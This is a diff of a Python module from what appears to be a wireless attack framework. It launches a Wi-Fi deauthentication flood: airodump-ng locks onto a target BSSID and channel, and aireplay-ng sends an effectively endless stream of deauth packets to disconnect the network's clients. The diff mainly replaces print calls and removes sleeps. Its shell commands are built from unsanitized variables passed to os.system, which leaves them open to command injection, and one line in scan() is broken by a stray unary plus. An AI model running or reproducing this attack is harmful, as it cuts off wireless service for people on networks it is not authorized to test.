@@ -1,9 +1,9 @@
 #        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 
+from core.messages import *
 from collections import OrderedDict
 import subprocess
 import os
-from time import sleep
 from core import colors
 from core import getpath
 
@@ -44,30 +44,25 @@ changelog = "Version 1.0:\n\trelease"
 
 
 def run():
-	print (colors.green + "[*] Attack Has Been Started on : " + variables['essid'][0])
-	print ("use command 'stop' to end attack" + colors.end)
+	printInfo("attack has been started on : " + variables['essid'][0])
+	printInfo("use command 'stop' to end attack" + colors.end)
 	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
 	os.system(xterm_3)
-	sleep(4)
 	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
 	os.system(xterm_4)
-	sleep(1)
 	os.system(xterm_4)
-	sleep(3)
-	print(colors.green+"attack started"+colors.end)
+	printInfo("attack started")
 
 def stop(args):
 	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	xterm_5 =  "airmon-ng"+" stop " + variables['interface'][0]
 	os.system(xterm_5)
-	print(colors.green+"process terminated..."+colors.end)
+	printSuccess("process terminated...")
 
 def scan(args):
 	xterm_1 = "airmon-ng"+" start " + variables['interface'][0]
 	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
 	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-	sleep(3)
 	os.system(xterm_2)
-	sleep(4)
-	print(colors.green+"scan started"+colors.end)
+	printSuccess("scan started")
